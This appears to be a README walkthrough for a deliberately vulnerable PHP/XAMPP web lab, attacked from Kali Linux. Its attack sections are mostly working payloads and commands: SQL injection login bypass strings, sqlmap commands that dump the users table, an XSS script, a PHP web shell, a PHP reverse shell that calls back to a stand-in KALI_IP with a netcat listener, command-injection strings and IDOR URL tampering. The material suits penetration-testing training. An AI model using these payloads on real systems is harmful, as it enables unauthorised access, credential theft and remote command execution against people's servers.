# vulnerable-web-lab
# vulnerable-web-lab

# 💥 Detailed Exploitation Guide
## 🌐 Accessing the Lab from Kali Linux
### Step 1: Find Target IP (Windows Machine)

Noote: "change the ip address according to your Xamp and kali"

On Windows (XAMPP machine):

ipconfig
Example:
192.168.100.6

---

### Step 2: Access from Kali
Open browser in Kali:
http://192.168.100.6/vulnerable-lab

---

### Step 3: Route Traffic Through Burp Suite

1. Open Burp Suite
2. Go to Proxy → Intercept → Turn ON
3. Configure Firefox proxy:
127.0.0.1 : 8080
Now all traffic is captured.

---

# 💣 SQL Injection (Authentication Bypass)

## 🎯 Target
login.php
---

## 🔍 Step 1: Capture Request (Burp Suite)

Intercept login request:
POST /vulnerable-lab/login.php
username=admin&password=admin

---

## ⚔️ Step 2: Inject Payload

Modify request:
username=' OR '1'='1&password=anything
---

## 💥 Result

- Login bypass successful
- Access to dashboard without valid credentials

---

## 🧠 Why It Works

Backend query:

```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='anything'

👉 '1'='1' is always TRUE
👉 Authentication bypassed

🔥 More Payloads
' OR 1=1--
admin'--
' OR 'a'='a


🤖 Automated Exploitation using SQLMap

Step 1: Capture Request (Burp)

Save request as file:

request.txt
Step 2: Run SQLMap
sqlmap -r request.txt --dbs
Step 3: Extract Tables
sqlmap -r request.txt -D pentest_lab --tables
Step 4: Dump Data
sqlmap -r request.txt -D pentest_lab -T users --dump

💥 Result
Extracted usernames & passwords from database
🧪 XSS (Cross-Site Scripting)

Payload:
<script>alert('XSS')</script>
Result:
JavaScript executes in browser
Demonstrates client-side injection


📁 File Upload → Remote Code Execution
Step 1: Create Web Shell
shell.php
<?php system($_GET['cmd']); ?>
Step 2: Upload File

Upload via:
upload.php
Step 3: Execute Commands
http://192.168.100.6/vulnerable-lab/uploads/shell.php?cmd=whoami

💥 Result
Remote command execution achieved


🖥 Reverse Shell (Windows → Kali)
Step 1: Start Listener (Kali)
nc -lvnp 4444
Step 2: Upload Reverse Shell
<?php
$sock=fsockopen("KALI_IP",4444);
$proc=proc_open("cmd.exe", array(0=>$sock,1=>$sock,2=>$sock),$pipes);
?>
Step 3: Trigger Shell
http://TARGET/uploads/shell.php

💥 Result
Remote shell access on Kali


💣 Command Injection
Vulnerable Input:
ping -n 2 <user_input>
Payloads:
127.0.0.1 & whoami
127.0.0.1 & dir
127.0.0.1 & ipconfig

💥 Result
System commands executed on server


🔓 IDOR (Insecure Direct Object Reference)
URL:
profile.php?id=1
Attack:
profile.php?id=2
profile.php?id=3
💥 Result
Access to other users' data without authorization



🛠 Tools Used
Burp Suite → Intercept & modify requests
SQLMap → Automated SQL injection
Kali Linux → Attacker environment
Netcat → Reverse shell listener
